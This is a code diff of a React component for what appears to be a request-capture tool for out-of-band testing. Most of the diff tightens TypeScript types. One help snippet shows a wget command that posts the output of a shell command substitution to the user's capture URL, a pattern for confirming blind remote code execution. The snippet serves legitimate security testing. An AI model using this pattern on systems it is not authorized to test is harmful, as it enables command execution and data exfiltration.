@@ -9,14 +9,17 @@ interface UserSession {
   subdomain: string;
   domain: string;
   url?: string;
-  requests?: Record<string, any>;
+  requests?: Record<string, Record<string, unknown>>;
   selectedRequest?: string;
 }
 
 interface RequestsPageProps {
   user: UserSession | null;
-  sharedRequest?: any | null;
-  toast?: any;
+  sharedRequest?: Record<string, unknown> | null;
+  toast?: {
+    info: (message: string, options?: Record<string, unknown>) => void;
+    error: (message: string, options?: Record<string, unknown>) => void;
+  };
   activeSession?: string;
 }
 
@@ -25,12 +28,8 @@ export function RequestsPage({
   sharedRequest,
 }: RequestsPageProps): React.ReactElement {
   const [isEditorFocused, setIsEditorFocused] = useState<boolean>(false);
-  const [selectedRequest, setSelectedRequest] = useState<any | null>(null);
+  const [selectedRequest, setSelectedRequest] = useState<Record<string, unknown> | null>(null);
 
-  useEffect(() => {
-    if (user && user.requests && Object.keys(user.requests).length > 0) {
-    }
-  }, [user?.requests ? Object.keys(user.requests).length : 0]);
 
   useEffect(() => {
     if (!user) {
@@ -148,7 +147,7 @@ print("Latest Request:", new_request)`;
             <br />
             <br />
             <code>
-              wget --post-data "$(echo RCE)" -O-{" "}
+              wget --post-data &quot;$(echo RCE)&quot; -O-{" "}
               {user?.url || `${user?.subdomain}.${user?.domain}`}
             </code>
             <br />
@@ -176,7 +175,7 @@ print("Latest Request:", new_request)`;
             />
             <EditorComponent
               value={content}
-              onChange={() => {}}
+              onChange={() => { /* No changes needed */ }}
               commands={[]}
               language={"python"}
               onFocus={handleEditorFocus}
